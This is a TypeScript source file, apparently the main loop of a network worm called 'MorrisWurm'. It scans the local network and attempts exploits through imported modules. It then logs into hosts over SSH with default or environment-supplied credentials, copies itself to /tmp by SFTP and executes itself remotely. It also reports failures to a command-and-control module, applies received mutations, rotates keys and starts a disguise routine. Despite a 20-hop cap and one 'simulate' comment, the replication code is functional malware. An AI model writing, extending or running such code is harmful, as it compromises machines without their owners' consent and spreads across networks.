import { recon } from './modules/recon';
import { attemptExploit, getLastError } from './modules/exploit';
import { reportFailure, receiveMod } from './modules/c2';
import { generateKey, rotateKey } from './modules/crypto';
import { syncVariants } from './modules/connector';
import { logger, startDisguise } from './utils';
import { Target, ErrorLog } from '../types/index';
import { Client } from 'ssh2';
import fs from 'fs';
import path from 'path';

const selfReplicate = (target: Target): Promise<void> => {
    return new Promise((resolve, reject) => {
        logger.info(`Module [Replicate]: Initiating self-replication sequence to ${target.ip}...`);
        
        const conn = new Client();
        const timeout = 10000; // 10 second timeout

        const timer = setTimeout(() => {
            conn.end();
            reject(new Error(`Replication to ${target.ip} timed out after ${timeout / 1000}s`));
        }, timeout);

        conn.on('ready', () => {
            logger.info(`Module [Replicate]: SSH connection established with ${target.ip}.`);
            
            conn.sftp((err, sftp) => {
                if (err) {
                    clearTimeout(timer);
                    conn.end();
                    return reject(err);
                }

                const localPayloadPath = path.join(__dirname, 'worm.ts');
                const remotePayloadPath = `/tmp/worm_payload.ts`;
                
                logger.info(`Module [Replicate]: Using SFTP to copy payload to ${target.ip}:${remotePayloadPath}`);

                const readStream = fs.createReadStream(localPayloadPath);
                const writeStream = sftp.createWriteStream(remotePayloadPath);
                
                writeStream.on('close', () => {
                   logger.info(`Module [Replicate]: Payload transfer complete.`);
                   logger.info(`Module [Replicate]: Executing payload remotely on ${target.ip}...`);

                   // Simulate remote execution
                   conn.exec(`ts-node ${remotePayloadPath}`, (err, stream) => {
                       if (err) {
                           clearTimeout(timer);
                           conn.end();
                           return reject(err);
                       }
                       stream.on('close', () => {
                           logger.info(`Module [Replicate]: Remote execution finished. Replication successful.`);
                           clearTimeout(timer);
                           conn.end();
                           resolve();
                       }).on('data', (data: Buffer) => {
                           logger.info(`[REMOTE:${target.ip}] STDOUT: ${data.toString().trim()}`);
                       }).stderr.on('data', (data: Buffer) => {
                           logger.warn(`[REMOTE:${target.ip}] STDERR: ${data.toString().trim()}`);
                       });
                   });
                });
                
                writeStream.on('error', (sftpErr) => {
                    clearTimeout(timer);
                    conn.end();
                    reject(sftpErr);
                });

                readStream.pipe(writeStream);
            });

        }).on('error', (connErr) => {
            clearTimeout(timer);
            reject(connErr);
        }).connect({
            host: target.ip,
            port: target.ports.includes(22) ? 22 : target.ports[0], // Prefer port 22 if available
            username: process.env.SSH_USER || 'testuser', // Weak creds from env or default
            password: process.env.SSH_PASS || 'password'
        });
    });
};


const applyMutation = (mutated: { name: string } | null): void => {
    if (mutated) {
        logger.info(`Applying mutation: ${mutated.name}`);
    }
};

async function main(): Promise<void> {
    logger.info('MorrisWurm slithering awake...');
    startDisguise();

    let currentKey = generateKey();
    let hopCount = 0;
    const TTL_HOPS = 20;

    while (hopCount < TTL_HOPS) {
        const targets = await recon.scanLocalNet();
        for (const target of targets) {
            if (await attemptExploit(target, currentKey)) {
                try {
                    await selfReplicate(target);
                    hopCount++; // Only increment on successful replication
                    logger.info(`Successful hop! Count is now ${hopCount}.`);
                } catch (replicationError: any) {
                    logger.error(`Replication to ${target.ip} failed: ${replicationError.message}`);
                    await reportFailure({ type: 'replication_fail', details: replicationError.message, targetIp: target.ip }, currentKey);
                }
            } else {
                const error = getLastError();
                await reportFailure({ ...error, targetIp: target.ip }, currentKey);
                const mutated = await receiveMod();
                applyMutation(mutated);
            }
        }
        
        if (targets.length === 0) {
            logger.info('No targets found in this cycle. Waiting before next scan.');
        }

        await syncVariants(currentKey);
        currentKey = rotateKey(currentKey);
        logger.info(`Loop tick complete. Successful hops: ${hopCount}/${TTL_HOPS}`);
        
        await new Promise(resolve => setTimeout(resolve, 5000));
    }

    logger.info(`TTL cap of ${TTL_HOPS} reached—poof`);
    process.exit(0);
}

main().catch(err => {
    logger.error('A fatal error occurred:', err);
    process.exit(1);
});
